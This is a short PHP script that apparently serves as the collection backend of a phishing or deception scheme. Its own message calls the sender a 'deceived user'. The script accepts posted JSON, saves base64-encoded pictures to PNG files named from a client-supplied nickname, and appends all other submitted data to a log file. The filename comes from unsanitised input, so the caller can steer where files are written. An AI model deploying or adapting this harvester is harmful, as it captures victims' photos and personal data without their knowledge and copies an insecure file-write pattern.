<?php
$file = 'log.txt';
$content = file_get_contents("php://input");
if (empty($content)) {
    echo "No deceived user sent.";
} else {
		$obj = json_decode($content);
		//echo $obj->{'pictureb64'};
		if (isset($obj->{'pictureb64'})) {
			$filteredData = explode(',', $obj->{'pictureb64'});
			$unencoded = base64_decode($filteredData[1]);
			//Create the image 
			$fp = fopen($obj->{'nickname'}.'.png', 'w');
			fwrite($fp, $unencoded);
			fclose($fp);
		} else {
			$obj2 = json_encode($obj);
		
			//echo $obj->{'pictureb64'};
	    if (file_put_contents($file, $obj2 . "\n", FILE_APPEND | LOCK_EX)) {
	        echo "Successfully saved to " . $file;
	    } else {
	        echo "Could not save to " . $file;
	    }
		}
		
		
}
